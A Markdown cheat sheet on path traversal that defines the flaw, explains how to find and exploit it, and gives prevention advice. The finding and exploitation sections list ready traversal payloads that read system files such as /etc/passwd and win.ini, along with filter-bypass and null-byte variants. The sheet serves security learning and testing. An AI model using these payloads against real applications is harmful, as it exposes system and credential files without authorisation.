# Path Traversal

</br>

## Definition
- File Path Traversal (or Directory Traversal) is a vulnerability that allows an attacker to read files on the server that is running the application.

</br>

---

## How To Find
- *Map the application:*
    - Identify all instances where the web application appears to contain the name of a file or directory.
    - Identify all functions in the application whose implementation is likely to involve retrieval of data from a server filesystem.
- Test identified instances with common directory traversal payloads and observe how the application responds.
    - Some common payloads:
        ```bash
        ../../../../etc/passwd
        ../../../etc/passwd
        ../../.htaccess
        \..\WINDOWS\win.ini
        \..\..\WINDOWS\win.ini
        ```
- Automatae testing using a web application vulnerability scanner (WAVS).

<br/>

---
## How To Exploit
- **Regular case**
    - Examples:
        ```bash
        ../../../../etc/passwd
        .\..\..\..\..\WINDOWS\win.ini
        ```
- **Absolute path case**
    - Example:
        ```bash
        /etc/passwd
        ```
- **Traversal sequences stripped non-recursively**
    - Example:
        ```bash
        ....//....//...//etc/passwd
        ```
- **Bypass traversal sequences stripped defense using URL encoding (single or double encoding)**

- **Bypass start of path validation**
    - Example:
        ```bash
        /var/www/images/../../../etc/passwd
        ```

- **Bypass file extinsion validation using Null Byte**
    - Example:
        ```bash
        ../../../etc/passwd%00.png
        ```
</br>

---
## How To Prevent
- Validate the user input before processing it. Ideally, compare the user input with a whitelist of permitted values. If that isn't possible, verify that the input contains only permitted content, such as alphanumeric characters only.
- After validating the supplied input, append the input to the base directory and use a platform filesystem API to canonicalize the path. Verify that the canonicalized path starts with the expected base directory.